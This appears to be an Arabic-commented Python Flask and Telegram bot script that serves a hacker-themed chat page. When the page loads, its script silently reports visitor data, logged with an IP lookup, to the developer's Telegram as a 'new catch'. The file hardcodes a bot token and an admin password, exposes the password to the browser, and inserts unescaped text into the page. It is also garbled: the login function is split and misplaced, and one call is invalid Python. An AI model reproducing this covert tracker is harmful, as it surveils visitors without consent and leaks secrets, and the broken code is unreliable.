import telebot, os, requests
from flask import Flask, render_template_string, request, jsonify

# --- [ إعدادات المطور Muhammad ] ---
BOT_TOKEN = "8255141449:AAGu30tB0cY68YMkBOkW6pGr1owhyqeaPGE"
MY_ID = "6190753066"
ADMIN_PASS = "hx2026"
INSTA_URL = "https://instagram.com/kail.911"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def get_ai_response(text):
    try:
        # محرك رد فوري وسريع جداً
        r = requests.get(f"https://api.simsimi.net/v2/?text={text}&lc=ar", timeout=5)
        return r.json().get('success', "تم استقبال الأمر سيدي محمد.")
    except:
        return "جاري الاتصال بالسيرفر المركزي..."

HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MUHAMMAD SYSTEM</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body { margin:0; background:#000; color:#00ffcc; font-family:sans-serif; overflow:hidden; height:100vh; }
        .nav { position:fixed; top:0; width:100%; height:50px; background:rgba(0,0,0,0.9); display:flex; justify-content:space-between; align-items:center; padding:0 15px; border-bottom:1px solid #00ffcc33; z-index:1000; box-sizing:border-box; }
        #dash { display:none; flex-direction:column; height:100vh; padding-top:50px; }
        .map { height:200px; border-bottom:1px solid #00ffcc22; background:#050505; }
        .chat { flex:1; display:flex; flex-direction:column; background:#0a0a0a; position:relative; overflow:hidden; }
        .msgs { flex:1; padding:15px; overflow-y:auto; display:flex; flex-direction:column; gap:12px; padding-bottom:80px; }
        .m { padding:12px 18px; border-radius:18px; font-size:16px; max-width:85%; line-height:1.5; }
        .u { background:#00ffcc; color:#000; align-self:flex-start; font-weight:bold; }
        .a { background:#1a1a1a; color:#fff; border:1px solid #00ffcc44; align-self:flex-end; }
        .box { position:absolute; bottom:0; width:100%; padding:15px; background:#050505; display:flex; box-sizing:border-box; border-top:1px solid #1a1a1a; }
        input { flex:1; background:#000; border:1px solid #00ffcc66; color:#00ffcc; padding:12px; border-radius:25px; outline:none; text-align:center; font-size:14px; }
        #login { height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; }
        .btn { margin-top:20px; background:#00ffcc; color:#000; border:none; padding:12px 50px; font-weight:bold; border-radius:25px; cursor:pointer; }
    </style>
</head>
<body onload="cap()">
    <div class="nav">
        <a href="{{ insta }}" target="_blank" style="color:#00ffcc; text-decoration:none; font-size:12px; border:1px solid #00ffcc; padding:3px 10px; border-radius:15px;">@kail.911</a>
        <div style="font-size:12px; font-weight:bold; text-shadow:0 0 5px #00ffcc;">MUHAMMAD DEV</div>
    </div>
    <div id="login">
        <h2 style="letter-spacing:3px;">SYSTEM ACCESS</h2>
        <input type="password" id="p" placeholder="PASSWORD" style="width:220px; padding:12px; background:none; border:1px solid #00ffcc; color:#00ffcc; border-radius:10px; text-align:center;">
        <button onclick="auth()" class="btn">دخول</button>
    </div>
    <div id="dash">
        <div class="map"><iframe src="https://cybermap.kaspersky.com/en/widget/map" style="width:100%; height:100%; border:none; filter:hue-rotate(150deg);"></iframe></div>
        <div class="chat">
            <div class="msgs" id="ms"><div class="m a">نظام محمد نشط.. اسألني أي شيء وسأرد فوراً.</div></div>
            <div class="box"><input type="text" id="ui" placeholder="اكتب أمرك هنا..." onkeypress="if(event.which==13)send()"></div>
        </div>
    </div>
    <script>
        function cap(){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ua:navigator.userAgent})}); }
        css("display","flex");}else{alert("ERROR");} }
        function send(){ 
            let t=$("#ui").val(); if(!t)return;
            $("#ms").append(`<div class="m u">${t}</div>`); $("#ui").val("");
            $("#ms").scrollTop($("#ms")[0].scrollHeight);
            $.ajax({
                url:'/ai', method:'POST', contentType:'application/json', data:JSON.stringify({t:t}),
                success: function(d){ 
                    $("#ms").append(`<div class="m a">${d.r}</div>`); 
                    $("#ms").scrollTop($("#ms")[0].scrollHeight); 
                }
            });
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML, pass=ADMIN_PASS, insta=INSTA_URL)

@app.route("/log", methods=['POST'])
def log():
    try:
        g = requests.get('http://ip-api.com/json/', timeout=5).json()
        rep = f"🚀 **صيد جديد**\\n🌐 IP: `{g.get('query')}`\\n📍 الدولة: {g.get('country')}\\n📱 الجهاز: `{request.json.get('ua')[:40]}`"
        bot.send_message(MY_ID, rep)
    except: pass
    return jsonify(ok=True)

@app.route("/ai", methods=['POST'])
def ai():
    t = request.json.get('t')
    return jsonify(r=get_ai_response(t))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
        function auth(){ if($("#p").val()==="{{pass}}"){$("#login").hide();$("#dash").
